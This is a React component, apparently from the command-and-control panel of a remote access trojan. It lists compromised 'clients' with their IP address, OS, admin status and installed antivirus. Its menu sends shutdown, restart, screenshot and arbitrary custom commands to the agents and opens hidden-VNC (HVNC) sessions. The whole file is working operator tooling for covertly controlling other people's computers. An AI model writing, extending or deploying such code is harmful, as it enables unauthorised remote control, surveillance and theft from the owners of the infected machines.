import React, { useState, useEffect } from 'react';
import { Agent } from '../types';
import toast from 'react-hot-toast';
import { API_URL } from '../config';
import { FiMoreVertical, FiShield, FiShieldOff, FiCamera, FiTerminal, FiInfo, FiPower, FiRefreshCw, FiMonitor } from 'react-icons/fi';

interface UserTableProps {
  users: Agent[];
  onViewUser: (user: Agent) => void;
  onViewTasks: (user: Agent) => void;
  onOpenHvnc?: (user: Agent) => void;
}

const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks, onOpenHvnc }) => {
  const [selectedUser, setSelectedUser] = useState<Agent | null>(null);
  const [showCustomCommand, setShowCustomCommand] = useState<Agent | null>(null);
  const [customCommand, setCustomCommand] = useState('');

  // Separate online and offline users
  const onlineUsers = users.filter(user => user.status === 'online');
  const offlineUsers = users.filter(user => user.status === 'offline');

  const formatLastActive = (dateString: string) => {
    const date = new Date(dateString);
    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMins / 60);
    const diffDays = Math.floor(diffHours / 24);

    if (diffMins < 1) return 'Just now';
    if (diffMins < 60) return `${diffMins}m ago`;
    if (diffHours < 24) return `${diffHours}h ago`;
    return `${diffDays}d ago`;
  };

  const formatUptime = (uptime: number) => {
    const days = Math.floor(uptime / 86400);
    const hours = Math.floor((uptime % 86400) / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    if (days > 0) return `${days}d ${hours}h`;
    if (hours > 0) return `${hours}h ${minutes}m`;
    return `${minutes}m`;
  };

  const getRealIP = (user: Agent) => {
    // For localhost testing, show actual IP if available
    if (user.ipAddress === '127.0.0.1' || user.ipAddress === 'localhost') {
      return user.ip || '127.0.0.1';
    }
    return user.ipAddress;
  };

  const getOSVersion = (user: Agent) => {
    if (user.osVersion && user.osVersion !== 'Unknown') {
      return user.osVersion;
    }
    // Extract OS version from platform string
    if (user.platform) {
      const platformLower = user.platform.toLowerCase();
      if (platformLower.includes('windows 11')) {
        return 'Windows 11';
      } else if (platformLower.includes('windows 10')) {
        return 'Windows 10';
      } else if (platformLower.includes('windows')) {
        return 'Windows';
      } else if (platformLower.includes('linux')) {
        return 'Linux';
      } else if (platformLower.includes('macos') || platformLower.includes('darwin')) {
        return 'macOS';
      }
    }
    return 'Unknown';
  };

  const getAntivirus = (user: Agent) => {
    if (user.systemInfo?.antivirus && Array.isArray(user.systemInfo.antivirus)) {
      return user.systemInfo.antivirus.join(', ') || 'None detected';
    } else if (user.systemInfo?.antivirus) {
      return user.systemInfo.antivirus;
    }
    return 'Unknown';
  };

  const handleQuickCommand = async (user: Agent, command: string) => {
    console.log('handleQuickCommand called with user:', user);
    console.log('user.id:', user.id);
    console.log('user.uuid:', user.uuid);
    console.log('user.computerName:', user.computerName);
    try {
      const response = await fetch(`${API_URL}/agent/${user.id}/command`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('accessToken')}`
        },
        body: JSON.stringify({
          command: command,
          type: 'system'
        })
      });
      
      if (response.ok) {
        const result = await response.json();
        console.log(`Command ${command} sent to ${user.computerName}:`, result);
        // Show success notification
        toast.success(`Command ${command} sent successfully to ${user.computerName}`);
      } else {
        const errorData = await response.json().catch(() => ({ message: response.statusText }));
        console.error('Failed to send command:', errorData);
        toast.error(`Failed to send command ${command}: ${errorData.message || response.statusText}`);
      }
    } catch (error: any) {
      console.error('Failed to send command:', error);
      toast.error(`Error sending command ${command} to ${user.computerName}: ${error.message}`);
    }
  };

  const handleCustomCommand = async (user: Agent) => {
    if (!customCommand.trim()) {
      toast.error('Please enter a command');
      return;
    }

    await handleQuickCommand(user, customCommand);
    setCustomCommand('');
    setShowCustomCommand(null);
  };

  const FloatingActionMenu = ({ user }: { user: Agent }) => {
    const [showActions, setShowActions] = useState(false);

    return (
      <div className="relative">
        <button
          className="premium-floating-menu-button"
          onClick={() => setShowActions(!showActions)}
        >
          <FiMoreVertical className="w-4 h-4" />
        </button>
        
        {showActions && (
          <div className="premium-dropdown show">
            <div className="premium-dropdown-item" onClick={() => handleQuickCommand(user, 'shutdown')}>
              <FiPower className="w-4 h-4 mr-2" />
              Shutdown
            </div>
            <div className="premium-dropdown-item" onClick={() => handleQuickCommand(user, 'restart')}>
              <FiRefreshCw className="w-4 h-4 mr-2" />
              Restart
            </div>
            <div className="premium-dropdown-item" onClick={() => handleQuickCommand(user, 'screenshot')}>
              <FiCamera className="w-4 h-4 mr-2" />
              Screenshot
            </div>
              {user.features?.hvnc && user.status === 'online' && (
                <div className="premium-dropdown-item" onClick={() => onOpenHvnc?.(user)}>
                  <FiMonitor className="w-4 h-4 mr-2" />
                  HVNC Session
                </div>
              )}
            <div className="premium-dropdown-item" onClick={() => onViewUser(user)}>
              <FiInfo className="w-4 h-4 mr-2" />
              View Details
            </div>
            <div className="premium-dropdown-item" onClick={() => setShowCustomCommand(user)}>
              <FiTerminal className="w-4 h-4 mr-2" />
              Custom Command
            </div>
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="space-y-6">
      {/* Online Clients - Top Priority */}
      <div className="premium-card">
        <div className="premium-card-header">
          <h2 className="text-xl font-semibold" style={{color: 'var(--text-primary)'}}>
            🟢 Online Clients ({onlineUsers.length})
          </h2>
        </div>
        
        {onlineUsers.length > 0 ? (
          <div className="overflow-x-auto">
            <table className="w-full text-sm text-left">
              <thead className="text-xs text-gray-500 dark:text-gray-400 uppercase bg-gray-50 dark:bg-gray-800">
                <tr>
                  <th className="px-6 py-3">Computer Name</th>
                  <th className="px-6 py-3">IP Address</th>
                  <th className="px-6 py-3">Operating System</th>
                  <th className="px-6 py-3">Uptime</th>
                  <th className="px-6 py-3">Last Activity</th>
                  <th className="px-6 py-3">Antivirus</th>
                  <th className="px-6 py-3">Actions</th>
                </tr>
              </thead>
              <tbody>
                {onlineUsers.map((user) => (
                  <tr key={user.id} className="hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors">
                    <td className="px-6 py-4">
                      <div className="flex items-center space-x-3">
                        <div className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
                        <div>
                          <div className="font-medium text-gray-900 dark:text-white">{user.computerName}</div>
                          <div className="text-xs text-gray-500 dark:text-gray-400">{user.uuid}</div>
                          {user.systemInfo?.isAdmin && (
                            <div className="flex items-center mt-1">
                              <FiShield className="w-3 h-3 text-yellow-500 mr-1" />
                              <span className="text-xs text-yellow-600 dark:text-yellow-400">Admin</span>
                            </div>
                          )}
                        </div>
                      </div>
                    </td>
                    <td className="px-6 py-4 text-gray-900 dark:text-white">{getRealIP(user)}</td>
                    <td className="px-6 py-4">
                      <span className="px-2 py-1 text-xs font-medium bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-200 rounded-full">
                        {getOSVersion(user)}
                      </span>
                    </td>
                    <td className="px-6 py-4 text-gray-900 dark:text-white">
                      {user.systemInfo?.uptime ? formatUptime(user.systemInfo.uptime) : 'Unknown'}
                    </td>
                    <td className="px-6 py-4 text-green-600 dark:text-green-400">{formatLastActive(user.lastActiveTime)}</td>
                    <td className="px-6 py-4 text-gray-900 dark:text-white">
                      <span className="text-xs">{getAntivirus(user)}</span>
                    </td>
                    <td className="px-6 py-4">
                      <FloatingActionMenu user={user} />
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <div className="px-6 py-8 text-center text-gray-500 dark:text-gray-400">
            <div className="text-4xl mb-4">🔍</div>
            <p>No online clients found</p>
            <p className="text-sm mt-2">Start the client to see it appear here</p>
          </div>
        )}
      </div>

      {/* Offline Clients - Collapsible */}
      {offlineUsers.length > 0 && (
        <div className="premium-card">
          <details className="group">
            <summary className="premium-card-header cursor-pointer list-none">
              <div className="flex items-center justify-between">
                <h2 className="text-xl font-semibold" style={{color: 'var(--text-primary)'}}>
                  🔴 Offline Clients ({offlineUsers.length})
                </h2>
                <div className="transform group-open:rotate-180 transition-transform">
                  <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                  </svg>
                </div>
              </div>
            </summary>
            
            <div className="overflow-x-auto">
              <table className="w-full text-sm text-left">
                <thead className="text-xs text-gray-500 dark:text-gray-400 uppercase bg-gray-50 dark:bg-gray-800">
                  <tr>
                    <th className="px-6 py-3">Computer Name</th>
                    <th className="px-6 py-3">IP Address</th>
                    <th className="px-6 py-3">Operating System</th>
                    <th className="px-6 py-3">Last Seen</th>
                    <th className="px-6 py-3">Antivirus</th>
                    <th className="px-6 py-3">Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {offlineUsers.map((user) => (
                    <tr key={user.id} className="hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors">
                      <td className="px-6 py-4">
                        <div className="flex items-center space-x-3">
                          <div className="w-3 h-3 bg-red-400 rounded-full"></div>
                          <div>
                            <div className="font-medium text-gray-900 dark:text-white">{user.computerName}</div>
                            <div className="text-xs text-gray-500 dark:text-gray-400">{user.uuid}</div>
                            {user.systemInfo?.isAdmin && (
                              <div className="flex items-center mt-1">
                                <FiShield className="w-3 h-3 text-yellow-500 mr-1" />
                                <span className="text-xs text-yellow-600 dark:text-yellow-400">Admin</span>
                              </div>
                            )}
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4 text-gray-900 dark:text-white">{getRealIP(user)}</td>
                      <td className="px-6 py-4">
                        <span className="px-2 py-1 text-xs font-medium bg-gray-100 text-gray-800 dark:bg-gray-700 dark:text-gray-200 rounded-full">
                          {getOSVersion(user)}
                        </span>
                      </td>
                      <td className="px-6 py-4 text-red-600 dark:text-red-400">{formatLastActive(user.lastActiveTime)}</td>
                      <td className="px-6 py-4 text-gray-900 dark:text-white">
                        <span className="text-xs">{getAntivirus(user)}</span>
                      </td>
                      <td className="px-6 py-4">
                        <button
                          onClick={() => onViewUser(user)}
                          className="premium-button text-xs"
                        >
                          View Details
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </details>
        </div>
      )}

      {/* Custom Command Modal */}
      {showCustomCommand && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="premium-card max-w-md w-full mx-4">
            <div className="premium-card-header">
              <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
                Custom Command - {showCustomCommand.computerName}
              </h3>
            </div>
            <div className="p-6">
              <div className="mb-4">
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Command to execute:
                </label>
                <input
                  type="text"
                  value={customCommand}
                  onChange={(e) => setCustomCommand(e.target.value)}
                  placeholder="Enter command..."
                  className="premium-input w-full"
                  onKeyPress={(e) => e.key === 'Enter' && handleCustomCommand(showCustomCommand)}
                />
              </div>
              <div className="flex justify-end space-x-3">
                <button
                  onClick={() => setShowCustomCommand(null)}
                  className="premium-button bg-gray-600 hover:bg-gray-700"
                >
                  Cancel
                </button>
                <button
                  onClick={() => handleCustomCommand(showCustomCommand)}
                  className="premium-button"
                >
                  Execute
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default UserTable;